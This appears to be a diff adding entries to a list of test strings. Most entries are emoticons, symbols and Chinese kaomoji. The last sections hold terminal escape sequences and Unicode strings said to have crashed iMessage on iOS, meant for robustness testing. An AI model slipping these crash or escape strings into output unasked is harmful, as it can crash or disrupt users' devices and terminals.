+♡.4　╮╰ ╯ *^_^* ^*^ ^-^ ^_^ ^（^ ∵∴‖｜ ｜︴﹏﹋﹌（）〔〕
+
+♡.5　【】〖〗＠：！/ ' _ < > `,·。≈{}~ ～() _ -『』√ $ @ * & # ※
+
+♡.6　卐 々∞Ψ ∪∩∈∏ の ℡ ぁ §∮”〃ミ灬ξ№∑⌒ξζω＊ㄨ ≮≯ ＋
+
+♡.7　－×÷＋－±／＝∫∮∝ ∞ ∧∨ ∑ ∏ ‖∠ ≌ ∽ ≤ ≥ ≈＜＞じ
+
+♡.8　☆veve↑↓⊙●★☆■♀『』◆◣◥▲Ψ ※◤ ◥ →№←㊣∑⌒〖〗＠
+
+♡.9　ξζω□∮〓※∴ぷ▂▃▅▆█ ∏卐【】△√ ∩¤々♀♂∞①ㄨ≡↘↙▂
+
+♡.10　▂ ▃ ▄ ▅ ▆ ▇ █┗┛╰☆╮ ≠ ▂ ▃ ▄ ▅
+
+♡.1．·°∴ ☆．．·°♡Yesterday ♡．·°
+
+♡.2　♡KicaZ宝贝o(╥﹏╥)o ♥♡　じ☆ve【 오빠 사랑해요 】*° ^_^.......♧♧
+
+♡.3　┢┦aΡｐy ♡^_^♡　☜♥☞　☞　☜　ぜ长ヤ乷　｡◕‿◕｡Cool Friends｡◕‿◕｡
+
+♡.4　【】—一　▄【┻┳═一　▄【┳一　▄【┻═┳一　▄【┳-一
+
+♡.5　▄【┻═┳　【┳═一　▄【┳一·　▄【┳═一　【┳═一oO
+
+♡.6　-—═┳【　∝╬══→　::======>>　┈━═☆　┣▇▇▇═—
+
+♡.7　ゅ≈小鱼≈ゅ　卐　 ♡ゞ、 时差 7 or 8 小时‘ヅ♡ ◈◇
+
+♡. 8 ...¤¸¸.·´¯`·.¸·.>>--» 洛雨·晴缘«---<<·.¸¸.·´¯`·.¸¸.¤...
+
+♡. 9 ╬叮咛╬　One fifth...☺☺ &( ^___^ )& 麻花辫女孩
+
+♡. 10 (？o？) 喔？ (☆＿☆) 眼睛一亮 (*^〔^*) 羞羞脸
+
+♡. 11 (作鬼脸) ( 「 「 ) ~~~→ 怀疑喔～～ (‧_‧？) 什麼事啊？
+
+♡. 12 (．．) 请问～ (((^^)(^^))) 什麼什麼，告诉我吧！
+
+♡. 13 ( *^_^* ) 笑(打招呼) ( T___T ) 怎麼会这样… (≥◇≤) 感动～
+
+♡.14 ……\ ( > < ) / 哇～出现了 ( ⊙ o ⊙ ) 目瞪口呆
+
+♡.15 ( ¯ □ ¯ ) 脑中一片空白 ( *>.<* ) ~@ 酸～～！
+
+♡.16 ( E___E ) 念昏了头 ( $ _ $ ) 见钱眼开！( 3__3 ) 刚睡醒～
+
+♡.17 (ｂ_ｄ) 戴了副眼镜 (*^＠^*) 乖～还含个奶嘴哦
+
+♡.18 ( ＠^^＠) 脸红了啦！ o(‧'‧)o (皱眉头)
+
+♡.19 Chris' Blog™ ♪ ♬ ๑•ิ.•ั๑ ♠ ♣ ✖
+
+♡.20 ♂ ♀ ♥ ♡ ☜ ☞ ☎ ☏ ⊙ ◎ ☺ ☻► ◄ ▧ ▨ ♨ ◐ ◑ ↔ ↕ ▪ ▫
+
+♡.21 ☼ ♦ ? ▄ █ ▌ ? ? ? ▬ ♦ ◊ ◦ ☼ ♠ ♣ ▣ ▤ ▥
+
+♡.22 ▦ ▩ ◘ ◙ ◈ ♫ ♬ ♪ ♩ ♭ ♪ の ☆→ あ ぃ ￡ ❤ ｡◕‿◕｡
+
+♡.ゃōゃ ⊙▂⊙　⊙０⊙　⊙＾⊙　⊙ω⊙　⊙﹏⊙　⊙△⊙　⊙▽⊙
+
+♡.◑▂◐　◑０◐　◑＾◐　◑ω◐　◑﹏◐　◑△◐　　◑▽◐
+
+♡.∩▂∩　∩０∩　∩＾∩　∩ω∩　∩﹏∩　∩△∩　∩▽∩
+
+♡.●▂●　　●０●　　●＾●　　●ω●　　●﹏●　　●△● 　●▽●
+
+♡.∪▂∪　∪０∪　∪＾∪　∪ω∪　∪﹏∪　∪△∪　∪▽∪
+
+♡. ≥▂≤　≥０≤　≥＾≤　≥ω≤　≥﹏≤　≥△≤　≥▽≤
+
+#	Human injection
+#
+#	Strings which may cause human to reinterpret worldview
+
+If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.
+
+#	Terminal escape codes
+#
+#	Strings which punish the fools who use cat/type on this file
+
+Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue
+But now...[20Cfor my greatest trick...[8m
+The quick brown fox... [Beeeep]
+
+#	iOS Vulnerabilities
+#
+#	Strings which crashed iMessage in various versions of iOS
+
+Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
+🏳0🌈️
+జ్ఞ‌ా
